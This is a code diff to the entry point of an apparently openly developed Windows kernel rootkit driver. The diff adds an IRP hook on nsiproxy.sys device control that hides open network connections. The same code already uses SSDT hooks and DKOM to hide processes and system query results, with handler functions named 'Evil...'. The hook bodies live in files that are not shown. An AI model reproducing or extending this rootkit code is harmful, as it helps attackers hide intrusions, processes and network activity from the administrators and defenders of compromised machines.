@@ -1,5 +1,6 @@
 #include "piping.h"
 #include "DKOM.h"
+#include "irp.h"
 #pragma warning(disable : 4996)
 #pragma warning(disable : 4127)
 
@@ -10,16 +11,16 @@ BOOL HookRelease() {
     if (!IS_DKOM) {
         roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_TAG);
     }
+    irphooking::ReleaseIrpHook(NSIPROXY_TAG, IRP_MJ_DEVICE_CONTROL);
     process::DKUnhideProcess(REMOVE_BY_INDEX_PID, 0);
     return TRUE;
 }
 
 
-//extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
-extern "C" NTSTATUS DriverEntry(PVOID AllocationAddress, ULONG64 AllocationSize){
-    //UNREFERENCED_PARAMETER(RegistryPath);
-    //UNREFERENCED_PARAMETER(DriverObject);
+extern "C" NTSTATUS DriverEntry(_In_ DRIVER_OBJECT * DriverObject, _In_ PUNICODE_STRING RegistryPath){
     ULONG64 MediumPID = 0;
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
 
 
     // Hook NtQueryDirectoryFile/Ex and NtQuerySystemInformation (BETA) if IS_DKOM = 0 (FALSE):
@@ -32,6 +33,21 @@ extern "C" NTSTATUS DriverEntry(PVOID AllocationAddress, ULONG64 AllocationSize)
         return STATUS_UNSUCCESSFUL;
     }
     if (!IS_DKOM && !NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQuerySystemInformation, NTQUERYSYSINFO_TAG))) {
+        HookRelease();
+        return STATUS_UNSUCCESSFUL;
+    }
+
+
+    // IRP hook IRP_MJ_DEVICE_CONTROL of nsiproxy.sys to hide open connections:
+    if (!NT_SUCCESS(irphooking::port_list::InitializePortList())) {
+        HookRelease();
+        return STATUS_UNSUCCESSFUL;
+    }
+    //if (!NT_SUCCESS(irphooking::port_list::AddToPortList(DEFAULT_MEDIUM_PORT))) {
+    //    HookRelease();
+    //    return STATUS_UNSUCCESSFUL;
+    //}
+    if (!NT_SUCCESS(irphooking::InitializeIrpHook(NSIPROXY_TAG, IRP_MJ_DEVICE_CONTROL, &irphooking::EvilMajorDeviceControlNsiProxy))) {
         HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
@@ -59,7 +75,6 @@ extern "C" NTSTATUS DriverEntry(PVOID AllocationAddress, ULONG64 AllocationSize)
         "Discord: bldysis#0868  GitHub: shaygitub\n"
         "\n----------\n";
 
-    DbgPrintEx(0, 0, "Allocation base address: %p, Allocation size: %llu\n", AllocationAddress, AllocationSize);
     DbgPrintEx(0, 0, "%s", HelloMessage);
 
     
